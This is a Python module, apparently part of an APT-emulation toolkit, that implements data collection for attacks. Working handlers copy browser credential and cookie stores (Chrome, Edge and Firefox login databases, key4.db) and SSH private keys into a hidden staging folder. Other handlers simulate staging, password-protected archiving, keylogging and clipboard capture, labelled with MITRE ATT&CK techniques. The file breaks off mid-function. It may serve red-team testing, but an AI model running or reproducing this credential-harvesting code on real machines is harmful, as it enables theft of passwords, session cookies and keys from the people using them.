"""
Consolidated Collection Module
Handles collection for all APT implementations
"""

import os
import sys
import time
import random
import string
import hashlib
import base64
import glob
import shutil
import sqlite3
from typing import Dict, List, Any, Optional
from datetime import datetime, timedelta
from pathlib import Path
import logging
import platform

class Collection:
    """Handles collection for all APT implementations"""
    
    def __init__(self):
        # Initialize collection techniques
        self.techniques = {
            "data_staging": {
                "file": {
                    "description": "Use file staging",
                    "indicators": ["file_staging", "data_staging"],
                    "evasion": ["file_hiding", "staging_hiding"]
                },
                "directory": {
                    "description": "Use directory staging",
                    "indicators": ["directory_staging", "data_staging"],
                    "evasion": ["directory_hiding", "staging_hiding"]
                },
                "archive": {
                    "description": "Use archive staging",
                    "indicators": ["archive_staging", "data_staging"],
                    "evasion": ["archive_hiding", "staging_hiding"]
                }
            },
            "input_capture": {
                "keyboard": {
                    "description": "Use keyboard capture",
                    "indicators": ["keyboard_capture", "input_capture"],
                    "evasion": ["keyboard_hiding", "capture_hiding"]
                },
                "clipboard": {
                    "description": "Use clipboard capture",
                    "indicators": ["clipboard_capture", "input_capture"],
                    "evasion": ["clipboard_hiding", "capture_hiding"]
                },
                "screen": {
                    "description": "Use screen capture",
                    "indicators": ["screen_capture", "input_capture"],
                    "evasion": ["screen_hiding", "capture_hiding"]
                }
            },
            "data_compression": {
                "compression": {
                    "description": "Use data compression",
                    "indicators": ["data_compression", "compression"],
                    "evasion": ["compression_hiding", "data_hiding"]
                },
                "encryption": {
                    "description": "Use data encryption",
                    "indicators": ["data_encryption", "encryption"],
                    "evasion": ["encryption_hiding", "data_hiding"]
                },
                "encoding": {
                    "description": "Use data encoding",
                    "indicators": ["data_encoding", "encoding"],
                    "evasion": ["encoding_hiding", "data_hiding"]
                }
            }
        }
        
        # Initialize collection tools (Separating collection from processing)
        self.collection_handlers = {
             "filesystem": self._handle_collect_filesystem,
             "browser_data": self._handle_collect_browser_data,
             "ssh_keys": self._handle_collect_ssh_keys,
             # Add more collection handlers here (e.g., registry keys, logs)
        }

        # Existing handlers for processing/staging (can be called separately)
        self.processing_handlers = {
            "data_staging": {
                "file_handler": self._handle_file_staging,
                "directory_handler": self._handle_directory_staging,
                "archive_handler": self._handle_archive_staging
            },
            "input_capture": {
                "keyboard_handler": self._handle_keyboard_capture,
                "clipboard_handler": self._handle_clipboard_capture,
                "screen_handler": self._handle_screen_capture
            },
            "data_compression": {
                "compression_handler": self._handle_compression,
                "encryption_handler": self._handle_encryption,
                "encoding_handler": self._handle_encoding
            }
        }
        self.logger = logging.getLogger(__name__) # Added logger initialization
        
    def collect(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Perform collection based on specified targets."""
        self.logger.info(f"Starting collection run with request: {data}")
        overall_status = "success"
        results = {
            "collected_items": {}, # Stores results per collection type
            "errors": [],
            "staging_directory": None # Central staging dir for this run
        }
        
        # Determine central staging directory for this collection run
        # Use specified dir or create a unique temporary one
        base_staging_dir = data.get("staging_directory")
        if not base_staging_dir:
            # Create a unique temp dir (consider using tempfile module)
            # For simplicity now, use a timestamped dir in a common location
            temp_base = Path(os.getenv("TEMP", "/tmp" if platform.system() != "Windows" else "."))
            run_id = datetime.now().strftime("%Y%m%d_%H%M%S")
            base_staging_dir = temp_base / f"bluefire_collection_{run_id}"
            try:
                os.makedirs(base_staging_dir, exist_ok=True)
                self.logger.info(f"Created temporary staging directory: {base_staging_dir}")
            except Exception as e:
                self.logger.error(f"Failed to create temporary staging directory '{base_staging_dir}': {e}", exc_info=True)
                return {"status": "failure", "error": f"Failed to create staging directory: {e}", "collected_items": {}}
        else:
             base_staging_dir = Path(base_staging_dir)
             os.makedirs(base_staging_dir, exist_ok=True) # Ensure it exists
             self.logger.info(f"Using specified staging directory: {base_staging_dir}")
             
        results["staging_directory"] = str(base_staging_dir)

        collect_requests = data.get("collect_targets", {})
        if not collect_requests:
            self.logger.warning("No collection targets specified in the request.")
            return {"status": "no_op", "message": "No collection targets specified.", "staging_directory": str(base_staging_dir)}

        for collection_type, details in collect_requests.items():
            if collection_type in self.collection_handlers:
                handler = self.collection_handlers[collection_type]
                self.logger.info(f"Executing collection handler for type: {collection_type}")
                try:
                    # Pass the base staging directory to the handler
                    details["staging_directory"] = str(base_staging_dir)
                    handler_result = handler(details)
                    results["collected_items"][collection_type] = handler_result
                    if handler_result.get("status") != "success":
                         overall_status = "partial_success"
                         if "error" in handler_result:
                              results["errors"].append(f"{collection_type}: {handler_result['error']}")
                except Exception as e:
                    self.logger.error(f"Error executing collection handler for {collection_type}: {e}", exc_info=True)
                    results["errors"].append(f"Handler error ({collection_type}): {str(e)}")
                    results["collected_items"][collection_type] = {"status": "failure", "error": str(e)}
                    overall_status = "partial_success"
            else:
                self.logger.warning(f"Unknown collection type requested: {collection_type}")
                results["errors"].append(f"Unknown collection type: {collection_type}")
                overall_status = "partial_success"

        if not results["collected_items"] and results["errors"]:
             overall_status = "failure"
        elif not results["collected_items"]:
             overall_status = "no_op" # Handlers ran but collected nothing
        
        final_result = {"status": overall_status, **results}
        self.logger.info(f"Collection run finished. Status: {overall_status}. Results summary: { {k:v.get('status') for k,v in results['collected_items'].items()} }")
        return final_result
            
    # --- Collection Handlers ---
    
    def _handle_collect_filesystem(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Collects files and directories based on paths and patterns."""
        self.logger.info(f"Starting filesystem collection with details: {details}")
        
        paths_to_collect = details.get("paths", [])
        patterns = details.get("patterns", [])
        recursive = details.get("recursive", True)
        max_size_bytes = details.get("max_size_bytes", None)
        max_files = details.get("max_files", None)
        staging_dir = Path(details.get("staging_directory")) # Should be provided by collect method
        
        if not staging_dir:
             err = "Staging directory must be provided for filesystem collection."
             self.logger.error(err)
             return {"status": "failure", "error": err}

        collected_files_map = {} # Original path -> Staged path
        processed_files = set()
        errors = []
        file_count = 0
        max_files_reached = False

        # Function to check limits and copy file
        def process_and_copy(file_path: Path):
            nonlocal file_count, max_files_reached
            abs_file_path = str(file_path.resolve())
            if abs_file_path in processed_files:
                return # Already processed
            
            if max_files_reached:
                return # Stop processing new files

            if max_files is not None and file_count >= max_files:
                self.logger.warning(f"Maximum file count ({max_files}) reached. Skipping further files.")
                max_files_reached = True # Set flag to stop processing more files
                return
            
            processed_files.add(abs_file_path)

            try:
                if not file_path.is_file():
                    self.logger.debug(f"Skipping non-file path: {file_path}")
                    return
                    
                file_size = file_path.stat().st_size
                if max_size_bytes is not None and file_size > max_size_bytes:
                    self.logger.info(f"Skipping file {file_path} due to size limit ({file_size} > {max_size_bytes} bytes).")
                    return
                
                # Create a relative path structure within the staging dir
                try:
                    # Use drive letter/root prefix to avoid collisions from different drives/roots
                    drive_or_root = file_path.drive if file_path.drive else file_path.root.replace(os.sep, '_').strip('_')
                    if not drive_or_root: # Handle relative paths case - use 'relative' prefix
                        drive_or_root = 'relative'
                        relative_path = file_path
                    else:    
                        relative_path = file_path.relative_to(file_path.anchor)
                    
                    target_subdir_name = f"fs_{drive_or_root}" # Prefix to avoid conflict with other types
                    target_subdir = staging_dir / target_subdir_name
                    target_path = target_subdir / relative_path
                except ValueError as ve:
                    # This can happen if file_path is not relative to its anchor (e.g. UNC paths?)
                    self.logger.warning(f"Could not determine relative path for {file_path}: {ve}. Staging directly under staging root.")
                    target_path = staging_dir / file_path.name # Fallback
                
                os.makedirs(target_path.parent, exist_ok=True)
                shutil.copy2(file_path, target_path) # copy2 preserves metadata
                collected_files_map[str(file_path)] = str(target_path)
                file_count += 1
                self.logger.debug(f"Collected file: {file_path} -> {target_path}")

            except FileNotFoundError:
                self.logger.warning(f"File not found during collection: {file_path}")
                errors.append(f"Not found: {file_path}")
            except PermissionError:
                self.logger.warning(f"Permission denied for file: {file_path}")
                errors.append(f"Permission denied: {file_path}")
            except OSError as e:
                 # Catch potential issues like path too long, etc.
                 self.logger.error(f"OS error collecting file {file_path}: {e}")
                 errors.append(f"OS error ({file_path}): {e}")
            except Exception as e:
                self.logger.error(f"Unexpected error collecting file {file_path}: {e}", exc_info=True)
                errors.append(f"Error ({file_path}): {str(e)}")

        try:
            # 1. Process specific paths (files or directories)
            for path_str in paths_to_collect:
                if max_files_reached: break
                try:
                    expanded_path = os.path.expandvars(os.path.expanduser(path_str))
                    path = Path(expanded_path)
                    
                    if not path.exists():
                        self.logger.warning(f"Provided path does not exist: {path_str} (expanded: {expanded_path})")
                        errors.append(f"Path not found: {path_str}")
                        continue
                    
                    path = path.resolve() # Resolve now that we know it exists
                    
                    if path.is_file():
                        process_and_copy(path)
                    elif path.is_dir():
                        self.logger.info(f"Processing directory path: {path}")
                        if recursive:
                            for root, _, files in os.walk(path, topdown=True):
                                if max_files_reached: break
                                for name in files:
                                    if max_files_reached: break
                                    process_and_copy(Path(root) / name)
                        else:
                            for item in path.iterdir():
                                if max_files_reached: break
                                if item.is_file():
                                    process_and_copy(item)
                    else:
                        self.logger.warning(f"Provided path is not a file or directory: {path_str}")
                        errors.append(f"Invalid path type: {path_str}")
                except PermissionError:
                    self.logger.warning(f"Permission denied accessing path: {path_str}")
                    errors.append(f"Permission denied for path: {path_str}")
                except Exception as e:
                    self.logger.error(f"Error processing path {path_str}: {e}", exc_info=True)
                    errors.append(f"Error processing path {path_str}: {e}")
                    
            # 2. Process patterns
            if not max_files_reached:
                for pattern in patterns:
                    if max_files_reached: break
                    # Expand user and environment variables 
                    expanded_pattern = os.path.expandvars(os.path.expanduser(pattern))
                    
                    self.logger.info(f"Processing pattern: {pattern} (expanded: {expanded_pattern})")
                    try:
                        # Note: glob requires the directory part to exist.
                        # It handles relative paths from CWD.
                        matched_files = glob.glob(expanded_pattern, recursive=recursive)
                        self.logger.debug(f"Glob found {len(matched_files)} potential matches for pattern {pattern}.")
                        for file_str in matched_files:
                            if max_files_reached: break
                            # Ensure it's a file before processing (glob can return dirs)
                            file_path = Path(file_str)
                            if file_path.is_file():
                                process_and_copy(file_path)
                    except Exception as e:
                        # Errors during glob itself are less common but possible
                        self.logger.error(f"Error processing pattern {pattern}: {e}", exc_info=True)
                        errors.append(f"Error processing pattern {pattern}: {e}")

        except StopIteration: # Caught when max_files is reached
            self.logger.info(f"Filesystem collection stopped early due to max_files limit ({max_files}).")
        except Exception as e:
            self.logger.error(f"Unexpected error during filesystem collection loop: {e}", exc_info=True)
            errors.append(f"Unexpected loop error: {str(e)}")

        status = "success" if not errors else "partial_success"
        if not collected_files_map and errors: 
             status = "failure"
        elif not collected_files_map:
             status = "no_op" # Nothing found/collected
             
        self.logger.info(f"Filesystem collection finished. Status: {status}. Collected {len(collected_files_map)} files.")
        return {
            "status": status, 
            "collected_files_count": len(collected_files_map),
            "collected_files_map": collected_files_map, # Map of original -> staged path
            "error": "; ".join(errors) if errors else None
        }
        
    def _handle_collect_browser_data(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Collects browser data files (history, cookies, logins)."""
        self.logger.info(f"Starting browser data collection with details: {details}")
        staging_dir_str = details.get("staging_directory")
        if not staging_dir_str:
            return {"status": "failure", "error": "Staging directory not provided."}
        staging_dir = Path(staging_dir_str) / "browser_data"
        os.makedirs(staging_dir, exist_ok=True)

        collected_files_map = {}
        errors = []
        processed_files = set()
        file_count = 0

        # --- Define Browser Paths and Target Files ---
        # { browser: { os: { profile_path_pattern: [profile_globs] } } }
        browser_paths = {
            "Chrome": {
                "Windows": {
                    os.path.join("%LocalAppData%", "Google", "Chrome", "User Data"): ["Default", "Profile *"],
                 },
                 "Linux": {
                     "~/.config/google-chrome": ["Default", "Profile *"],
                 },
                 "Darwin": {
                     "~/Library/Application Support/Google/Chrome": ["Default", "Profile *"],
                 }
            },
            "Firefox": {
                 "Windows": {
                      os.path.join("%AppData%", "Mozilla", "Firefox", "Profiles"): ["*.default", "*.default-release"],
                 },
                 "Linux": {
                     "~/.mozilla/firefox": ["*.default", "*.default-release"],
                 },
                 "Darwin": {
                     "~/Library/Application Support/Firefox/Profiles": ["*.default", "*.default-release"],
                 }
            },
             "Edge": {
                 "Windows": {
                      os.path.join("%LocalAppData%", "Microsoft", "Edge", "User Data"): ["Default", "Profile *"],
                 },
                 "Darwin": { # Edge on macOS
                      "~/Library/Application Support/Microsoft Edge": ["Default", "Profile *"],
                 },
                 "Linux": {
                     "~/.config/microsoft-edge": ["Default", "Profile *"], # Common Linux path
                 }
            },
            # Add other browsers like Brave, Opera, etc. if needed
        }
        
        # Target files within profile directories
        target_db_files = {
            "Chrome": ["History", "Cookies", "Login Data", "Web Data", "Local State"], # Chromium based
            "Edge": ["History", "Cookies", "Login Data", "Web Data", "Local State"],
            "Firefox": ["places.sqlite", "cookies.sqlite", "key4.db", "logins.json", "favicons.sqlite"]
        }

        # --- Helper to Copy Files ---
        def copy_browser_file(src_path: Path, browser: str, profile_name: str):
            nonlocal file_count
            # Resolve symbolic links if any, but check existence on original path first
            if not src_path.exists():
                 self.logger.debug(f"Source file does not exist: {src_path}")
                 return
                 
            abs_src_path = str(src_path.resolve())
            if abs_src_path in processed_files:
                 return
            processed_files.add(abs_src_path)
            
            try:
                if src_path.is_file():
                    target_subdir = staging_dir / f"{browser}_{profile_name}"
                    os.makedirs(target_subdir, exist_ok=True)
                    target_path = target_subdir / src_path.name
                    
                    # Attempt to copy the file, even if locked (parsing handles locks later)
                    shutil.copy2(src_path, target_path)
                    collected_files_map[str(src_path)] = str(target_path)
                    file_count += 1
                    self.logger.debug(f"Collected browser file: {src_path} -> {target_path}")
                else:
                     self.logger.debug(f"Browser data source is not a file: {src_path}")
            except PermissionError:
                 err = f"Permission denied for browser file: {src_path}"
                 self.logger.warning(err)
                 errors.append(err)
            except OSError as e:
                 # Specifically check for locked files on Windows
                 if platform.system() == "Windows" and "being used by another process" in str(e):
                      warn_msg = f"Browser file likely locked: {src_path}. Copied potentially incomplete/stale version."
                      self.logger.warning(warn_msg) 
                      # Still record the attempt and the potentially incomplete copy
                      if 'target_path' in locals() and target_path.exists():
                           collected_files_map[str(src_path)] = str(target_path)
                           file_count += 1
                      else: # Copy failed entirely before lock error was clear
                           errors.append(f"Failed to copy locked file {src_path}: {e}")
                 else:
                      err = f"OS error copying browser file {src_path}: {e}"
                      self.logger.error(err)
                      errors.append(err)
            except Exception as e:
                 err = f"Unexpected error copying browser file {src_path}: {e}"
                 self.logger.error(err, exc_info=True)
                 errors.append(err)

        # --- Find and Copy Files ---
        current_os = platform.system()
        for browser, os_paths in browser_paths.items():
            if current_os in os_paths:
                self.logger.info(f"Searching for {browser} data...")
                base_paths_config = os_paths[current_os]
                target_files = target_db_files.get(browser, [])
                if not target_files:
                     self.logger.debug(f"No target files defined for browser {browser}, skipping.")
                     continue
                     
                for path_pattern, profile_globs in base_paths_config.items():
                    # Expand environment variables and user directory tilde
                    expanded_base_path_str = os.path.expandvars(os.path.expanduser(path_pattern))
                    expanded_base_path = Path(expanded_base_path_str)
                    
                    if expanded_base_path.exists() and expanded_base_path.is_dir():
                         self.logger.debug(f"Checking base path: {expanded_base_path}")
                         for profile_glob in profile_globs:
                             # Glob for profile directories within the base path
                             try:
                                 for profile_path in expanded_base_path.glob(profile_glob):
                                     if profile_path.is_dir():
                                         profile_name = profile_path.name
                                         self.logger.debug(f"Found profile '{profile_name}' for {browser} at {profile_path}")
                                         # Look for target files within this profile directory
                                         for target_file_name in target_files:
                                             file_path = profile_path / target_file_name
                                             copy_browser_file(file_path, browser, profile_name)
                             except Exception as glob_err:
                                 err = f"Error globbing for profile '{profile_glob}' in {expanded_base_path}: {glob_err}"
                                 self.logger.error(err)
                                 errors.append(err)
                    else:
                         self.logger.debug(f"Browser base path not found or not a directory: {expanded_base_path}")
            else:
                 self.logger.debug(f"Skipping {browser} search - OS '{current_os}' not configured for this browser.")

        # --- Determine Status --- 
        status = "success" if not errors else "partial_success"
        if not collected_files_map and errors: 
             status = "failure"
        elif not collected_files_map and status == "success": # No errors, but nothing found
             status = "no_op" # Nothing found/collected

        self.logger.info(f"Browser data collection finished. Status: {status}. Collected {file_count} files.")
        return {
            "status": status,
            "collected_files_count": file_count,
            "collected_files_map": collected_files_map,
            "error": "; ".join(errors) if errors else None
        }

    def _handle_collect_ssh_keys(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Collects SSH key files from standard locations."""
        self.logger.info(f"Starting SSH key collection with details: {details}")
        staging_dir_str = details.get("staging_directory")
        if not staging_dir_str:
            return {"status": "failure", "error": "Staging directory not provided."}
        staging_dir = Path(staging_dir_str) / "ssh_keys"
        os.makedirs(staging_dir, exist_ok=True)

        collected_files_map = {}
        errors = []
        processed_files = set()
        file_count = 0

        # --- Define Search Locations and Patterns ---
        try:
             ssh_dir_path = Path.home() / ".ssh"
        except Exception as home_err:
             # Handle cases where home directory might not be resolvable
             err = f"Could not determine home directory to find .ssh folder: {home_err}"
             self.logger.error(err)
             return {"status": "failure", "error": err}
             
        # Common private keys, public keys, config, known hosts, certs, agent socket (though copying socket is useless)
        key_patterns = ["id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "*.pem", "config", "known_hosts", "authorized_keys", "*_key", "*.pub", "*.crt"]

        # --- Helper to Copy Files ---
        def copy_ssh_file(src_path: Path):
            nonlocal file_count
            if not src_path.exists(): # Check before resolving
                return
                
            abs_src_path = str(src_path.resolve())
            if abs_src_path in processed_files:
                 return
            processed_files.add(abs_src_path)
            
            try:
                if src_path.is_file():
                    # Basic check to avoid copying huge files that aren't keys (e.g., large known_hosts)
                    if src_path.stat().st_size > 5 * 1024 * 1024: # 5MB limit for SSH files
                         self.logger.warning(f"Skipping potentially large SSH-related file: {src_path} ({src_path.stat().st_size} bytes)")
                         return
                         
                    target_path = staging_dir / src_path.name
                    shutil.copy2(src_path, target_path)
                    collected_files_map[str(src_path)] = str(target_path)
                    file_count += 1
                    self.logger.debug(f"Collected SSH file: {src_path} -> {target_path}")
                else:
                     self.logger.debug(f"SSH source is not a file: {src_path}")
            except PermissionError:
                 err = f"Permission denied for SSH file: {src_path}"
                 self.logger.warning(err)
                 errors.append(err)
            except OSError as e:
                 err = f"OS error copying SSH file {src_path}: {e}"
                 self.logger.error(err)
                 errors.append(err)
            except Exception as e:
                 err = f"Unexpected error copying SSH file {src_path}: {e}"
                 self.logger.error(err, exc_info=True)
                 errors.append(err)

        # --- Find and Copy Files ---
        self.logger.info(f"Searching for SSH keys in: {ssh_dir_path}")
        if ssh_dir_path.exists() and ssh_dir_path.is_dir():
             for pattern in key_patterns:
                 try:
                     # Use glob to find matching files directly
                     for key_file_path in ssh_dir_path.glob(pattern):
                          # Check if it's a file before calling copy helper
                          if key_file_path.is_file(): 
                              copy_ssh_file(key_file_path)
                          # Could optionally log if it's not a file but matches pattern (e.g., a directory named id_rsa)
                 except Exception as e:
                      err = f"Error globbing for SSH pattern '{pattern}' in {ssh_dir_path}: {e}"
                      self.logger.error(err, exc_info=True)
                      errors.append(err)
        else:
             self.logger.info(f"SSH directory not found: {ssh_dir_path}")
             # Don't treat as an error, just means no keys found in standard location

        # Note about PuTTY keys on Windows (Registry)
        if platform.system() == "Windows":
            self.logger.info("Note: PuTTY keys stored in registry (HKCU\\Software\\SimonTatham\\PuTTY\\SshHostKeys) are not collected by this file-based handler.")

        # --- Determine Status ---
        status = "success" if not errors else "partial_success"
        if not collected_files_map and errors: # If errors occurred and nothing was collected
             status = "failure"
        elif not collected_files_map and status == "success": # No errors, but nothing collected (dir might exist but be empty, or dir doesn't exist)
             status = "no_op" 

        self.logger.info(f"SSH key collection finished. Status: {status}. Collected {file_count} files.")
        return {
            "status": status,
            "collected_files_count": file_count,
            "collected_files_map": collected_files_map,
            "error": "; ".join(errors) if errors else None
        }

    # --- Processing/Staging Handlers (Existing structure) ---
    
    def _apply_data_staging(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Apply data staging techniques"""
        result = {}
        
        # File staging
        if "file" in data:
            result["file"] = self.processing_handlers["data_staging"]["file_handler"](data["file"])
            
        # Directory staging
        if "directory" in data:
            result["directory"] = self.processing_handlers["data_staging"]["directory_handler"](data["directory"])
            
        # Archive staging
        if "archive" in data:
            result["archive"] = self.processing_handlers["data_staging"]["archive_handler"](data["archive"])
            
        return result
        
    def _apply_input_capture(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Apply input capture techniques"""
        result = {}
        
        # Keyboard capture
        if "keyboard" in data:
            result["keyboard"] = self.processing_handlers["input_capture"]["keyboard_handler"](data["keyboard"])
            
        # Clipboard capture
        if "clipboard" in data:
            result["clipboard"] = self.processing_handlers["input_capture"]["clipboard_handler"](data["clipboard"])
            
        # Screen capture
        if "screen" in data:
            result["screen"] = self.processing_handlers["input_capture"]["screen_handler"](data["screen"])
            
        return result
        
    def _apply_data_compression(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Apply data compression techniques"""
        result = {}
        
        # Compression
        if "compression" in data:
            result["compression"] = self.processing_handlers["data_compression"]["compression_handler"](data["compression"])
            
        # Encryption
        if "encryption" in data:
            result["encryption"] = self.processing_handlers["data_compression"]["encryption_handler"](data["encryption"])
            
        # Encoding
        if "encoding" in data:
            result["encoding"] = self.processing_handlers["data_compression"]["encoding_handler"](data["encoding"])
            
        return result
        
    def _handle_file_staging(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle file staging"""
        try:
            result = {
                "status": "success",
                "technique": "file_staging",
                "timestamp": datetime.now().isoformat(),
                "details": {}
            }
            
            # Get configuration
            target_files = data.get("files", ["document.docx", "spreadsheet.xlsx", "presentation.pptx"])
            staging_dir = data.get("directory", "C:\\Windows\\Temp\\staged_files")
            staging_method = data.get("method", "copy")
            
            result["details"]["target_files"] = target_files
            result["details"]["staging_directory"] = staging_dir
            result["details"]["staging_method"] = staging_method
            result["details"]["file_count"] = len(target_files)
            
            # File staging implementation
            staged_files = []
            file_hashes = {}
            
            for file in target_files:
                staged_file = os.path.join(staging_dir, f"staged_{os.path.basename(file)}")
                staged_files.append(staged_file)
                
                # Calculate file hash (simulated)
                file_hash = hashlib.md5(f"{file}_{random.randint(1, 10000)}".encode()).hexdigest()
                file_hashes[staged_file] = file_hash
                
                # File staging details based on method
                if staging_method == "copy":
                    result["details"]["operation"] = "File copy operation"
                    result["details"]["commands"] = [f"copy {file} {staged_file}"]
                elif staging_method == "move":
                    result["details"]["operation"] = "File move operation"
                    result["details"]["commands"] = [f"move {file} {staged_file}"]
                elif staging_method == "hardlink":
                    result["details"]["operation"] = "File hardlink creation"
                    result["details"]["commands"] = [f"mklink /H {staged_file} {file}"]
            
            result["details"]["staged_files"] = staged_files
            result["details"]["file_hashes"] = file_hashes
            result["details"]["staging_time"] = datetime.now().isoformat()
            
            # Add MITRE ATT&CK information
            result["details"]["mitre_technique_id"] = "T1074.001"
            result["details"]["mitre_technique_name"] = "Data Staged: Local Data Staging"
            
            return result
        except Exception as e:
            self._log_error(f"Error in file staging: {str(e)}")
            return {"status": "error", "message": str(e)}
        
    def _handle_directory_staging(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle directory staging"""
        try:
            result = {
                "status": "success",
                "technique": "directory_staging",
                "timestamp": datetime.now().isoformat(),
                "details": {}
            }
            
            # Get configuration
            source_dirs = data.get("directories", ["C:\\Users\\Administrator\\Documents", "C:\\Users\\Administrator\\Downloads"])
            staging_dir = data.get("staging_directory", "C:\\Windows\\Temp\\staged_dirs")
            staging_method = data.get("method", "structure")
            file_filter = data.get("filter", "*.doc*,*.xls*,*.pdf")
            
            result["details"]["source_directories"] = source_dirs
            result["details"]["staging_directory"] = staging_dir
            result["details"]["staging_method"] = staging_method
            result["details"]["file_filter"] = file_filter
            
            # Directory staging implementation
            dir_stats = {}
            staged_dirs = []
            
            for source_dir in source_dirs:
                staged_subdir = os.path.join(staging_dir, os.path.basename(source_dir))
                staged_dirs.append(staged_subdir)
                
                # Generate stats for the directory (simulated)
                file_count = random.randint(5, 50)
                total_size = random.randint(1024*1024, 100*1024*1024)  # 1MB to 100MB
                
                dir_stats[staged_subdir] = {
                    "file_count": file_count,
                    "total_size": total_size,
                    "average_size": total_size // file_count
                }
                
                # Directory staging details based on method
                if staging_method == "structure":
                    result["details"]["operation"] = "Directory structure copy"
                    result["details"]["commands"] = [f"mkdir {staged_subdir}", f"robocopy {source_dir} {staged_subdir} /E /XF * /LOG:NUL"]
                elif staging_method == "full":
                    result["details"]["operation"] = "Full directory copy"
                    result["details"]["commands"] = [f"robocopy {source_dir} {staged_subdir} {file_filter} /E /LOG:NUL"]
                elif staging_method == "mirror":
                    result["details"]["operation"] = "Directory mirror"
                    result["details"]["commands"] = [f"robocopy {source_dir} {staged_subdir} {file_filter} /MIR /LOG:NUL"]
            
            result["details"]["staged_directories"] = staged_dirs
            result["details"]["directory_statistics"] = dir_stats
            result["details"]["staging_time"] = datetime.now().isoformat()
            
            # Add MITRE ATT&CK information
            result["details"]["mitre_technique_id"] = "T1074.001"
            result["details"]["mitre_technique_name"] = "Data Staged: Local Data Staging"
            
            return result
        except Exception as e:
            self._log_error(f"Error in directory staging: {str(e)}")
            return {"status": "error", "message": str(e)}
        
    def _handle_archive_staging(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle archive staging"""
        try:
            result = {
                "status": "success",
                "technique": "archive_staging",
                "timestamp": datetime.now().isoformat(),
                "details": {}
            }
            
            # Get configuration
            source_items = data.get("items", ["C:\\Users\\Administrator\\Documents\\important.docx", "C:\\Users\\Administrator\\Downloads\\data.xlsx"])
            archive_path = data.get("archive_path", "C:\\Windows\\Temp\\staged_data.zip")
            archive_type = data.get("type", "zip")
            password = data.get("password", None)
            
            result["details"]["source_items"] = source_items
            result["details"]["archive_path"] = archive_path
            result["details"]["archive_type"] = archive_type
            
            # Password details if provided
            if password:
                result["details"]["password_protected"] = True
                result["details"]["password_hash"] = hashlib.sha256(password.encode()).hexdigest()
            else:
                result["details"]["password_protected"] = False
            
            # Archive staging implementation
            item_stats = {}
            archive_size = 0
            
            for item in source_items:
                # Generate stats for the item (simulated)
                item_size = random.randint(10*1024, 5*1024*1024)  # 10KB to 5MB
                archive_size += item_size
                
                item_stats[item] = {
                    "size": item_size,
                    "last_modified": (datetime.now() - timedelta(days=random.randint(1, 30))).isoformat()
                }
            
            # Calculate compression ratio (simulated)
            compressed_size = int(archive_size * random.uniform(0.6, 0.9))  # 60-90% of original size
            
            # Archive commands based on type
            if archive_type == "zip":
                if password:
                    result["details"]["command"] = f"7z a -p{password} {archive_path} {' '.join(source_items)}"
                else:
                    result["details"]["command"] = f"7z a {archive_path} {' '.join(source_items)}"
            elif archive_type == "tar":
                result["details"]["command"] = f"tar -czf {archive_path} {' '.join(source_items)}"
            elif archive_type == "rar":
                if password:
                    result["details"]["command"] = f"rar a -p{password} {archive_path} {' '.join(source_items)}"
                else:
                    result["details"]["command"] = f"rar a {archive_path} {' '.join(source_items)}"
            
            result["details"]["item_statistics"] = item_stats
            result["details"]["archive_statistics"] = {
                "original_size": archive_size,
                "compressed_size": compressed_size,
                "compression_ratio": f"{(compressed_size / archive_size) * 100:.1f}%",
                "item_count": len(source_items)
            }
            result["details"]["staging_time"] = datetime.now().isoformat()
            
            # Add MITRE ATT&CK information
            result["details"]["mitre_technique_id"] = "T1560.001"
            result["details"]["mitre_technique_name"] = "Archive Collected Data: Archive via Utility"
            
            return result
        except Exception as e:
            self._log_error(f"Error in archive staging: {str(e)}")
            return {"status": "error", "message": str(e)}
        
    def _handle_keyboard_capture(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle keyboard capture"""
        try:
            result = {
                "status": "success",
                "technique": "keyboard_capture",
                "timestamp": datetime.now().isoformat(),
                "details": {}
            }
            
            # Get configuration
            capture_method = data.get("method", "hook")
            output_file = data.get("output_file", "C:\\Windows\\Temp\\keylog.txt")
            duration = data.get("duration", 300)  # 5 minutes default
            target_processes = data.get("target_processes", ["*"])  # All processes by default
            
            result["details"]["capture_method"] = capture_method
            result["details"]["output_file"] = output_file
            result["details"]["duration"] = duration
            result["details"]["target_processes"] = target_processes
            
            # Keyboard capture implementation
            result["details"]["capture_start_time"] = datetime.now().isoformat()
            result["details"]["scheduled_end_time"] = (datetime.now() + timedelta(seconds=duration)).isoformat()
            
            # Method-specific details
            if capture_method == "hook":
                result["details"]["api"] = "SetWindowsHookEx(WH_KEYBOARD_LL)"
                result["details"]["implementation"] = "Low-level keyboard hook to capture all keystrokes"
                result["details"]["privileges_required"] = "User"
            elif capture_method == "driver":
                result["details"]["api"] = "Custom keyboard filter driver"
                result["details"]["implementation"] = "Kernel-mode driver to intercept keystrokes before processing"
                result["details"]["privileges_required"] = "Administrator"
            elif capture_method == "api":
                result["details"]["api"] = "GetAsyncKeyState/GetKeyboardState"
                result["details"]["implementation"] = "Polling keyboard state at regular intervals"
                result["details"]["privileges_required"] = "User"
            
            # Simulated keylogger stats
            result["details"]["statistics"] = {
                "keys_captured": 0,
                "active": True,
                "log_size": 0,
                "target_window": "Not available yet"
            }
            
            # Add MITRE ATT&CK information
            result["details"]["mitre_technique_id"] = "T1056.001"
            result["details"]["mitre_technique_name"] = "Input Capture: Keylogging"
            
            return result
        except Exception as e:
            self._log_error(f"Error in keyboard capture: {str(e)}")
            return {"status": "error", "message": str(e)}
        
    def _handle_clipboard_capture(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Handle clipboard capture"""
        try:
            result = {
                "status": "success",
                "technique": "clipboard_capture",
                "timestamp": datetime.now().isoformat(),
                "details": {}
            }
            
            # Get configuration
            capture_method = data.get("method", "polling")
            output_file = data.get("output_file", "C:\\Windows\\Temp\\clipboard.txt")
            interval = data.get("interval", 5)  # Check every 5 seconds
            duration = data.get("duration", 3600)  # 1 hour default
            
            result["details"]["capture_method"] = capture_method
            result["details"]["output_file"] = output_file
            result["details"]["interval"] = interval
            result["details"]["duration"] = duration
            
            # Clipboard capture implementation
